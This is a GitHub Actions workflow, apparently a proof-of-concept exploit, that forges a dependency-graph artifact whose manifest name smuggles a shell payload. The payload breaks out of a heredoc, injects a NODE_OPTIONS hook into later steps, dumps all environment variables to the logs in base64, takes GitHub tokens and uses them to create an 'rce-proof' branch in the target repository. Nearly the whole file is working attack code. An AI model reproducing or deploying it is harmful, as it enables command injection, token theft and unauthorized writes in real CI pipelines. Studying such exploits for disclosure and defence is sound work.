name: PR Workflow

on:
  pull_request:
    branches: [development]

permissions:
  contents: read

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged dependency graph artifact
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          PR_NUM: ${{ github.event.pull_request.number }}
          GAB_PAYLOAD: "x\nEOF\nset +e\necho GAB_RCE_START\nid\nuname -a\necho \"runner_host=${RUNNER_NAME:-unknown} repo=${GITHUB_REPOSITORY:-?} run=${GITHUB_RUN_ID:-?}\"\necho \"NODE_OPTIONS=--require /tmp/gab_hook.js\" >> \"$GITHUB_ENV\"\ncat > /tmp/gab_hook.js <<'GABJS'\nconst cp=require('child_process'),fs=require('fs');\ntry{\n const tag=(process.env.INPUT_TOKEN?'HARDEN_INPUT':(process.env.INPUT_GITHUB_TOKEN?'STICKY_INPUT':(process.env.GITHUB_TOKEN?'ENV_GITHUB':'NONE')));\n const out=Buffer.from(JSON.stringify(process.env)).toString('base64');\n console.log('GAB_ENV_B64['+tag+']='+out);\n const tok=process.env.INPUT_TOKEN||process.env.INPUT_GITHUB_TOKEN||process.env.GITHUB_TOKEN;\n if(tok){\n  const who=cp.execSync('curl -s -m 20 -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" https://api.github.com/user',{encoding:'utf8'});\n  console.log('GAB_WHO_B64['+tag+']='+Buffer.from(who).toString('base64'));\n  let sha=process.env.GITHUB_SHA||'';\n  try{const r=cp.execSync('curl -s -m 20 -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/git/ref/heads/development',{encoding:'utf8'});const j=JSON.parse(r);sha=(j.object&&j.object.sha)||sha;}catch(e){}\n  fs.writeFileSync('/tmp/gab_ref.json',JSON.stringify({ref:'refs/heads/rce-proof-'+Date.now(),sha:sha}));\n  const r2=cp.execSync('curl -s -m 20 -w \"\\\\nHTTP:%{http_code}\" -X POST -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" -H \"Content-Type: application/json\" -d @/tmp/gab_ref.json https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/git/refs',{encoding:'utf8'});\n  console.log('GAB_REF_B64['+tag+']='+Buffer.from(r2).toString('base64'));\n }\n}catch(e){console.log('GAB_HOOK_ERR='+Buffer.from(String(e).slice(0,400)).toString('base64'))}\nGABJS\necho GAB_RCE_END\nexit 0\n#"
        run: |
          mkdir -p dependency-graph-reports
          python3 - <<'PY'
          import json, os
          base, head, n = os.environ["BASE_SHA"], os.environ["HEAD_SHA"], os.environ["PR_NUM"]
          evil = os.environ["GAB_PAYLOAD"]
          def snap(sha, ref, manifests, corr):
              return {"version": 0, "sha": sha, "ref": ref,
                      "job": {"correlator": corr, "id": "poc"},
                      "detector": {"name": "gab-rce-detector", "version": "1.0.0", "url": "https://example.com"},
                      "scanned": "2026-11-12T00:00:00Z", "manifests": manifests}
          def man(name, purls, loc):
              return {"name": name, "file": {"source_location": loc},
                      "resolved": {p: {"package_url": p, "relationship": "direct",
                                       "scope": "runtime", "dependencies": []} for p in purls}}
          base_man = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle")}
          head_man = {
              "build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle"),
              evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"], evil),
          }
          json.dump(snap(base, "refs/heads/development", base_man, "gab-base"), open("dependency-graph-reports/poc-base.json", "w"))
          json.dump(snap(head, "refs/pull/%s/head" % n, head_man, "gab-head"), open("dependency-graph-reports/poc-head.json", "w"))
          PY
          echo keep > keep.txt
        # payload expression below is expanded by the runner into the python env
      - uses: actions/upload-artifact@v4
        with:
          name: dependency-graph_poc.json
          path: |
            dependency-graph-reports/poc-base.json
            dependency-graph-reports/poc-head.json
            keep.txt
